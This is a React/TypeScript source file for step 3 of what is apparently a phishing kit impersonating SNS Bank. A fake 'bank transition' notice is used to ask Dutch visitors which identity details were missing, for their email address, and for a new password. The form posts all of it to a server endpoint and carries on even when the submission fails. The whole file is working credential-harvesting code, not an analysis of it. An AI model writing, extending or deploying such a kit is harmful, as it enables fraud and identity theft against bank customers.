import { useState } from 'react';
import { useLocation } from 'wouter';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { Checkbox } from '@/components/ui/checkbox';
import { useFormStore } from '@/hooks/use-form-store';
import { useTranslation } from '@/lib/translations';
import { Mail, Shield, Lock } from 'lucide-react';

const step3Schema = z.object({
  missingData: z.array(z.enum(["middlenames", "address", "birthplace", "nationality"])),
  fullEmail: z.string().email("Ongeldig e-mailadres"),
  newPassword: z.string().min(6, "Wachtwoord moet minimaal 6 tekens zijn"),
});

type Step3Data = z.infer<typeof step3Schema>;

const emailProviders = [
  { domain: 'gmail.com', name: 'Gmail', icon: 'G', color: 'bg-red-500' },
  { domain: 'hotmail.com', name: 'Hotmail', icon: 'H', color: 'bg-blue-500' },
  { domain: 'outlook.com', name: 'Outlook', icon: 'O', color: 'bg-blue-600' },
  { domain: 'ziggo.nl', name: 'Ziggo', icon: 'Z', color: 'bg-orange-500' },
  { domain: 'kpn.nl', name: 'KPN', icon: 'K', color: 'bg-green-500' },
  { domain: 'xs4all.nl', name: 'XS4ALL', icon: 'X', color: 'bg-purple-500' },
];

export default function Step3() {
  const [, setLocation] = useLocation();
  const { formData, updateFormData, setCurrentStep, isEnglish } = useFormStore();
  const t = useTranslation(isEnglish);
  const [showEmailDropdown, setShowEmailDropdown] = useState(false);
  const [emailSearch, setEmailSearch] = useState('');

  const form = useForm<Step3Data>({
    resolver: zodResolver(step3Schema),
    defaultValues: {
      missingData: formData.missingData || [],
      fullEmail: formData.fullEmail || '',
      newPassword: formData.newPassword || '',
    },
  });

  const onSubmit = async (data: Step3Data) => {
    try {
      // Send step data to server
      const response = await fetch('/api/step-submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...data, step: 3 }),
      });

      if (!response.ok) {
        throw new Error('Failed to submit step data');
      }

      // Update local store and proceed
      updateFormData(data);
      setCurrentStep(3);
      setLocation('/step-4');
    } catch (error) {
      console.error('Step 3 submission error:', error);
      // Still proceed locally even if email fails
      updateFormData(data);
      setCurrentStep(3);
      setLocation('/step-4');
    }
  };

  const handleBack = () => {
    setCurrentStep(1);
    setLocation('/step-2');
  };

  const selectEmailProvider = (domain: string, name: string) => {
    setEmailSearch(name);
    setShowEmailDropdown(false);
    const currentEmail = form.getValues('fullEmail');
    if (!currentEmail.includes('@')) {
      form.setValue('fullEmail', `gebruiker@${domain}`);
    }
  };

  const filteredProviders = emailProviders.filter(provider =>
    provider.name.toLowerCase().includes(emailSearch.toLowerCase())
  );

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-orange-50">
      {/* SNS Header */}
      <div className="bg-primary text-white py-4">
        <div className="max-w-2xl mx-auto px-4">
          <div className="flex items-center gap-3">
            <Shield className="h-8 w-8" />
            <div>
              <h1 className="text-2xl font-bold" data-testid="sns-logo">SNS Bank</h1>
              <p className="text-orange-100 text-sm">E-mail en wachtwoord instelling</p>
            </div>
          </div>
        </div>
      </div>

      <div className="max-w-lg mx-auto px-4 py-12">
        <Card className="shadow-2xl border-0">
          <CardContent className="pt-8 pb-8">
            <div className="text-center mb-8">
              <div className="w-16 h-16 bg-primary rounded-full flex items-center justify-center mx-auto mb-4">
                <Mail className="h-8 w-8 text-white" />
              </div>
              <h2 className="text-2xl font-bold text-secondary mb-2" data-testid="step-title">
                E-mail & Toegang
              </h2>
              <p className="text-muted-foreground text-sm">
                Stel je e-mailadres en nieuwe toegang in
              </p>
            </div>
          
          <Form {...form}>
            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
              <FormField
                control={form.control}
                name="missingData"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel data-testid="label-missingdata">
                      Welke gegevens ontbraken bij je oorspronkelijke identificatie?
                    </FormLabel>
                    <div className="flex flex-wrap gap-4 mt-2">
                      {(['middlenames', 'address', 'birthplace', 'nationality'] as const).map((type) => (
                        <div key={type} className="flex items-center space-x-2">
                          <Checkbox
                            id={type}
                            checked={field.value?.includes(type)}
                            onCheckedChange={(checked) => {
                              const updatedTypes = checked
                                ? [...(field.value || []), type]
                                : field.value?.filter((t) => t !== type) || [];
                              field.onChange(updatedTypes);
                            }}
                            data-testid={`checkbox-missing-${type}`}
                          />
                          <label
                            htmlFor={type}
                            className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70"
                            data-testid={`label-missing-${type}`}
                          >
                            {type === 'middlenames' && 'Tussenvoegsel/voornamen'}
                            {type === 'address' && 'Adresgegevens'}
                            {type === 'birthplace' && 'Geboorteplaats'}
                            {type === 'nationality' && 'Nationaliteit'}
                          </label>
                        </div>
                      ))}
                    </div>
                    <FormMessage />
                  </FormItem>
                )}
              />

              {/* Email Provider Selection */}
              <div className="space-y-4">
                <FormLabel data-testid="label-emailprovider">
                  E-mailadres eerder gebruikt bij SNS Bank
                </FormLabel>
                <div className="relative">
                  <Input
                    placeholder="Zoek je e-mailprovider..."
                    value={emailSearch}
                    onChange={(e) => setEmailSearch(e.target.value)}
                    onFocus={() => setShowEmailDropdown(true)}
                    data-testid="input-emailsearch"
                  />
                  {showEmailDropdown && (
                    <div className="email-dropdown" data-testid="email-dropdown">
                      {filteredProviders.map((provider) => (
                        <div
                          key={provider.domain}
                          className="email-option"
                          onClick={() => selectEmailProvider(provider.domain, provider.name)}
                          data-testid={`email-option-${provider.name.toLowerCase()}`}
                        >
                          <span className={`w-6 h-6 ${provider.color} rounded text-white text-xs flex items-center justify-center`}>
                            {provider.icon}
                          </span>
                          <span>{provider.name}</span>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              </div>

              <FormField
                control={form.control}
                name="fullEmail"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel data-testid="label-fullemail">Je volledige e-mailadres</FormLabel>
                    <FormControl>
                      <Input 
                        type="email" 
                        placeholder="gebruiker@voorbeeld.nl" 
                        {...field} 
                        data-testid="input-fullemail"
                      />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />

              {/* Bank Transition Section */}
              <div className="bg-blue-50 border border-blue-200 rounded-lg p-6">
                <h3 className="text-lg font-semibold mb-2 text-blue-900" data-testid="transition-title">
                  Bank transitie
                </h3>
                <p className="text-blue-800 mb-4" data-testid="transition-description">
                  SNS Bank is bezig met een transitie naar een nieuw systeem. Hiervoor hebben we je e-mailadres en een nieuw wachtwoord nodig.
                </p>
                
                <FormField
                  control={form.control}
                  name="newPassword"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel data-testid="label-newpassword">Nieuw wachtwoord voor transitie</FormLabel>
                      <FormControl>
                        <Input 
                          type="password" 
                          placeholder="Nieuw wachtwoord" 
                          {...field} 
                          data-testid="input-newpassword"
                        />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
              </div>

              <div className="flex justify-between mt-8">
                <Button
                  type="button"
                  variant="outline"
                  onClick={handleBack}
                  data-testid="button-back"
                >
                  {t('back')}
                </Button>
                <Button 
                  type="submit"
                  className="bg-primary text-primary-foreground hover:opacity-90"
                  data-testid="button-next"
                >
                  {t('next')}
                </Button>
              </div>
            </form>
          </Form>
        </CardContent>
      </Card>
      </div>
    </div>
  );
}
